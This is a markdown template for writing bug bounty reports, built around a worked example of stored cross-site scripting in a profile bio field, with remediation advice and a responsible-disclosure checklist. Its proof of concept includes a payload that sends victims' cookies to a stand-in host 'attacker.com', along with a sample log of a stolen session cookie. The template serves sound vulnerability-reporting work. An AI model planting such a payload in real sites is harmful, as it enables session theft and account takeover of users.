# Bug Bounty Report

> Optimize for: clarity, reproducibility, and impact. Triagers see hundreds of reports.
> Get to the point fast. Show the impact. Make it trivial to reproduce.

---

## Report Metadata

| Field | Value |
|---|---|
| **Title** | [One line: what it is and where — e.g., "Stored XSS in profile bio field allows account takeover"] |
| **Target** | [Program name / Asset] |
| **URL / Endpoint** | `https://target.com/path/to/endpoint` |
| **Vulnerability Type** | [OWASP category / CWE] |
| **Severity (Self-Assessed)** | Critical / High / Medium / Low |
| **CVSS Score** | X.X — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N |
| **Date Discovered** | YYYY-MM-DD |
| **Reported By** | [Your handle] |

---

## Summary

[2-3 sentences max. What is the vulnerability, where is it, and what's the worst-case impact?]

**Example:** *A stored cross-site scripting vulnerability exists in the profile bio field at `/settings/profile`. An authenticated attacker can inject a malicious payload that executes in the context of any user who views the attacker's profile, enabling session hijacking and full account takeover.*

---

## Impact

[This is the most important section. Be specific and realistic. Avoid generic statements like "this could lead to data breach." State exactly what an attacker can do and what that means.]

**What an attacker can do:**
- [Specific action 1 — e.g., "Steal session cookies from any user who views their profile"]
- [Specific action 2 — e.g., "Perform actions on behalf of victims (change email, password reset, payment methods)"]
- [Worst case — e.g., "Full account takeover of any account that views the attacker's profile page"]

**Scope of impact:**
- **Who is affected:** [All users / Authenticated users / Admin users / Users with specific role]
- **Data at risk:** [What data could be accessed or exfiltrated]
- **Prerequisites for attacker:** [Account required? Any other conditions?]

---

## Proof of Concept

**Environment:**
- Browser: [e.g., Chrome 120.0.6099.130]
- Account type used: [Free / Premium / No account]
- Date/time tested: YYYY-MM-DD HH:MM UTC

**Step-by-step reproduction:**

1. Create an account or log in at `https://target.com/login`
2. Navigate to `https://target.com/settings/profile`
3. In the **Bio** field, enter the following payload:
   ```html
   <img src=x onerror="fetch('https://attacker.com/c?c='+document.cookie)">
   ```
4. Click **Save Profile**
5. Log in as a different user (victim) and navigate to `https://target.com/users/attacker-username`
6. Observe that the victim's cookies are sent to `attacker.com`

**Attacker-controlled server log showing exfiltrated cookie:**
```
[2024-01-15 14:32:01] GET /c?c=session=eyJhbGc... HTTP/1.1
```

**Screenshot / Video:** [Attach or link to evidence]

---

## Root Cause

[Brief technical explanation. Why does this vulnerability exist?]

**Example:** *The bio field content is stored without sanitization and rendered without HTML encoding in the profile view template at `views/profile.html`, line 47: `{{ user.bio | raw }}`.*

---

## Remediation Suggestion

[Suggest a specific fix. Programs appreciate this — it speeds up triage and shows you know what you're talking about.]

**Recommended fix:**
- HTML-encode all user-supplied content before rendering: replace `{{ user.bio | raw }}` with `{{ user.bio | escape }}`
- Implement a Content Security Policy (CSP) header: `Content-Security-Policy: default-src 'self'`
- Consider using a sanitization library (e.g., DOMPurify) for rich-text bio fields

---

## Additional Notes

[Anything else relevant: similar endpoints you checked, whether you found this chained with other issues, confirmed it's not a known/duplicate, etc.]

- Tested on production only, with my own test accounts. No other users' data was accessed.
- I checked `/settings/profile`, `/settings/company`, and `/api/v1/user/update` — only the bio field in profile settings appears vulnerable.
- I did not attempt to exfiltrate actual user data; the PoC logs only confirmed execution, not data access.

---

## Attachments

- [ ] Screenshot(s) showing the vulnerability
- [ ] HTTP request/response (Burp Suite export or text)
- [ ] Video walkthrough (if complex)
- [ ] Attacker server log (redacted)

---

## Responsible Disclosure

- [ ] This is my original research
- [ ] I have not publicly disclosed this vulnerability
- [ ] I have not accessed any data beyond what was necessary to demonstrate impact
- [ ] I followed the program's responsible disclosure policy
- [ ] I am not located in a sanctioned country
